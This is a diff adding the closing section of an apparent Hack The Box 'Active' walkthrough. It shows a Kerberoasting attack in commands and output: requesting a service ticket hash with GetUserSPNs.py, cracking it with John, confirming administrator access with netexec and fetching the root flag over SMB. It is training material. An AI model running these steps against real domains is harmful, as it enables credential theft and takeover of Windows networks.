@@ -364,3 +364,111 @@ smb: \svc_tgs\Desktop\>
 ```
 
 <br />
+
+## Kerberoasting Attack:
+
+<br />
+
+`Kerberoasting` is a post-exploitation technique in Windows environments that targets the `Kerberos` authentication protocol (port 88).
+
+In this attack, an authenticated domain user requests a Kerberos ticket for a `Service Principal Name` (SPN). The retrieved Kerberos ticket is encrypted using a hash derived from the service account's password. Once the attacker retrieves this hash, it can be cracked offline using tools like Hashcat or John the Ripper.
+
+In most scenarios, you will need a valid account to perform a `Kerberoasting Attack`, however, if the `DC` is configured with the `UserAccountControl` flag set to `Do not require Kerberos pre-authentication`, it may be possible to request a valid ticket without valid domain credentials.
+
+<br />
+
+### Extracting the hash:
+
+<br />
+
+We can now perform the attack using the well-known `GetUsersSPNs.py` script from Impacket:
+
+<br />
+
+```bash
+❯ GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-06-19 06:03:59.624172             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5249c079501d61c5df8b1cae5ca6cd8b$8fc61dd72d6f48d96d8e52bbcb25932c46f92fc02a2da0969275c57e6b3d3256c886899c53906d9a068100922c42fc767f81bf28b2a2ff7446c623abb718045e815358826bcab7d89a2541c0e4ba7b340ff8fc864c4ea0c7cc8720dec669f5daa38f25dbcccaecbb6a450cda34e582696c262585db387134a30ef62ed470a69149ea90c1ca92da8c5a5878f7b98d8238898853eea51025d47525a6fa22a8f6fe49847593b0ac8380ddcab6ea62c426f064a93271d97b8dacb2502f5973e977b15c076775657bccde30f29798b76d87a398d0e4d7f9f0403b86940eadad33bad3bae4821e32beccaa38c07d38edf9a6769bacd32bd25bc198da61c61f008d4a7af546810f995e7f1007dda7726234c93e3d955438a7c29194f2b3449f048ab6b592a1012b2c546873ce26f9d2748eab5ca33fed5cce704a3451364eabb20721070617963fd2b28a386c0b26bca75180a14556d764faefada6d725ada3b31c9bf4dd287cecccd397388a2239eea9b1ea25e493d90afc28abe07ec20e47222f44ab6bb859b3aaad6c86cf537b8ce8bc21a388fc8770d38d64f041cb8b36678a4a34c421210857b791fee4604557bbc3608a362aa9f148f9746e839882fbd6672f4454f602fe24636ac897f004f8b13a28092445c31a85a754480931e0bb76bd664ebc0b2c9de5b58f9847b81dfcad1d640ac1a8b852fbbb60655e3767e2e60178d49f60dd0971d53a9b67c6ebbebb6bf8a35011fdb33c1d1b2b3ab2f432ca4c1ad49de83e1664de79717b3d80448c57886041575beb56f318a3445450f28e822c8bd182bad6a677cb6b30c6845424ebf4c139fbd574e59dcc4ad9b5132cac0aebc319370089addaecaeb82d6091bdb13d07025e59237b2980c466db5b651727567bf192c169b73e1452f1089a8885cbdf7ea20174f00838e28a8bcd7b4e8c0c4300148b6f05aca658922d33b0fb4b649a81561266602136a36a242bd6aaa799c0c0c2cdeb59a1f6e19a8f6100972ba9ab0821b1e6ce069cf6ade81c8c9e2a41a7c0e0147c0561e179f07436d26122fe720b8b5e6b036c7acabb2feb08b2e4cf9e170a010d2df5ad90a553b4733b752b40b84074aa9b354e4f8ca38977b781cda106e03828a0b97e8de9c8d3aa3c08f08e9a681192ff8f69cae64364c2c944d9d97f93f34c6dd3e63d3a5c118f29339ffbf9144cf902c130a8d00f7a952c01a8e00b102195762e3733e85010ce6c5dd57f0d7295d3ac23d07650b2da
+```
+
+<br />
+
+Great! We have the hash of the Adminstrator account.
+
+Now, we can crack it with `John`:
+
+<br />
+
+```bash
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Ticketmaster1968 (?)     
+1g 0:00:00:33 DONE (2025-06-19 21:47) 0.02963g/s 312359p/s 312359c/s 312359C/s Tiffani3..Theicon123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+<br />
+
+To validate these credentials, we run `netexec`:
+
+<br />
+
+```bash
+❯ netexec smb active.htb -u administrator -p Ticketmaster1968 --shares
+SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.100    445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)
+SMB         10.10.10.100    445    DC               [*] Enumerated shares
+SMB         10.10.10.100    445    DC               Share           Permissions     Remark
+SMB         10.10.10.100    445    DC               -----           -----------     ------
+SMB         10.10.10.100    445    DC               ADMIN$          READ,WRITE      Remote Admin
+SMB         10.10.10.100    445    DC               C$              READ,WRITE      Default share
+SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
+SMB         10.10.10.100    445    DC               NETLOGON        READ,WRITE      Logon server share
+SMB         10.10.10.100    445    DC               Replication     READ            
+SMB         10.10.10.100    445    DC               SYSVOL          READ,WRITE      Logon server share
+SMB         10.10.10.100    445    DC               Users           READ            
+
+```
+
+<br />
+
+We can connect to the `Users` share with `smbclient` and retrieve the `root.txt` flag:
+
+<br />
+
+```bash
+❯ smbclient //active.htb/Users -U administrator
+Password for [WORKGROUP\administrator]:
+Try "help" to get a list of possible commands.
+smb: \> get Administrator\Desktop\root.txt 
+getting file \Administrator\Desktop\root.txt of size 34 as Administrator\Desktop\root.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
+```
+
+```bash
+❯ /usr/bin/cat root.txt
+5f18ce50900ba9c718a4a9c84bxxxxxx
+```
+
+<br />
+
+One more Active Directory machine pwned!!
+
+This was a rather unusual case, since the WinRM port (5985) was closed and we couldn't establish a remote shell connection to the system.
+
+I hope you learned something and enjoyed the proccess.
+
+Keep hacking!!❤️❤️
+
+<br />
